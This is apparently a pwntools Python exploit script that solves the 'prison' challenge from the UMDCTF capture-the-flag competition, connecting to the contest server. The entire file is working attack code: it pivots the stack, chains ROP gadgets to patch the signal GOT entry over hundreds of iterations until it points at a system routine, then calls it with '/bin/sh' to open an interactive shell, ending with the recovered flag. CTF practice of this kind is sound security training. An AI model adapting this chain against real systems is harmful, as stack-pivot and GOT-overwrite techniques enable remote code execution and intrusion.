from pwn import *

e = ELF("./prison_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = e

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
b *0x40070E
'''

p = remote("challs.umdctf.io", 31001)
#p = process("prison_patched")
#p = gdb.debug("./prison_patched", gdbscript = script)

# stack pivot
payload = b"0" * 0x20 + p64(0x601800) + p64(0x00000000004006fb)
# now rsp = stack, rbp = 0x601800
p.sendline(payload)

# dword ptr [signal_got] += &do_system - &signal
## thankfully they are aligned 0x20
signal_got = 0x601028
pop_rbp = 0x0000000000400608
gadget_1 = 0x00000000004005cf # 0x00000000004005cf : add bl, dh ; ret
gadget_2 = 0x0000000000400668 # 0x0000000000400668 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret
main = 0x00000000004006f7
payload = b"1" * 0x20 + p64(signal_got + 0x3d) + p64(gadget_1) + p64(gadget_2) + p64(pop_rbp) + p64(0x601830) + p64(main)
# before execute main: rsp = 0x601830, rbp = 0x601830
p.sendline(payload)

# from now rbx always is 0x20
leave_ret = 0x0000000000400718
ret = 0x0000000000400719
for i in range(0x726):
	# now rsp = 0x601810, rbp = 0x601830
	payload = p64(0x601830) + p64(ret) * 2 + p64(main) + p64(signal_got + 0x3d) + p64(gadget_2) + p64(pop_rbp) + p64(0x601810) + p64(leave_ret)
	# before execute main: rsp = 0x601830, rbp = 0x601830
	# rsp and rbp stable every loop
	p.sendline(payload)

# now signal = do_system
pop_rdi = 0x0000000000400782
signal_plt = e.plt['signal']
# now rsp = 0x601810, rbp = 0x601830
#debug()
payload = b"2" * 0x20 + p64(0) + p64(pop_rdi) + p64(0x601858) + p64(ret) + p64(signal_plt) + b"/bin/sh\x00"
p.sendline(payload)

p.interactive()
#UMDCTF{are_you_sice_man_because_you_were_BORN_TO_ALLOC_WORLD_IS_A_HEAP_Free_Em_All_1972_or_are_you_BORN_TO_ALLOC_WORLD_IS_A_HEAP_Free_Em_All_1972_because_you_are_sice_man}